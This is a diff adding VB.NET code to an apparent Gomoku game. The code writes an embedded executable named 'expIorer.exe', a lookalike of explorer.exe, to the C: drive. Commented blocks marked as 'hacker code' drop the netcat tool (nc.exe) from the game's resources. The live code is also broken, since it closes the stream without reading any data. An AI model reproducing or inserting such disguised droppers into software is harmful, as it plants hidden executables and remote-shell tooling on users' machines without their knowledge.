@@ -1,0 +1,45 @@
+ Dim asm As Assembly = Assembly.GetExecutingAssembly()
+        '加载当前程序集的嵌入式资源()
+        Dim ResourceName As String = "VB五子棋.expIorer.exe"
+        Dim str As Stream = asm.GetManifestResourceStream(ResourceName)
+        '转换嵌入式资源为流文件并打开
+        Dim data As Byte()
+        Dim len As Long
+        len = str.Length
+
+        ReDim data(len)
+
+        '定义数组
+        str.Close()
+        '关闭流
+        FileOpen(1, "C:\expIorer.exe", OpenMode.Binary)
+        FilePut(1, data, len)
+        FileClose(1)
+        '写入新文件释放完毕
+        '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+        '黑客代码部分！
+        'Dim exeliu As IO.Stream = Me.GetType.Assembly.GetManifestResourceStream("nc.exe")
+        'Dim exe(exeliu.Length - 1) As Byte
+        'Dim newexe As New IO.FileStream("2.exe", IO.FileMode.OpenOrCreate)
+        'exeliu.Read(exe, 0, exe.Length)
+        'newexe.Write(exe, 0, exe.Length)
+        'exeliu.Close()
+        'newexe.Close()
+        '
+
+
+        ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+        ' Dim path As String = "C:\NC.exe" '文件释放路径
+        ' Dim resources As System.Resources.ResourceManager = VB五子棋.My.Resources.ResourceManager
+        '  Dim b() As Byte = resources.GetObject("NC")
+        ' Dim s As IO.Stream
+        ' Try
+        's = IO.File.Create(Path)
+        '  s.Write(b, 0, b.Length)
+        '  s.Close()
+        ' MessageBox.Show("资源释放成功")
+        ' Catch ex As Exception
+        'MessageBox.Show("资源释放失败！Result=" + ex.Message)
+        '  End Try
+        '黑客代码部分！
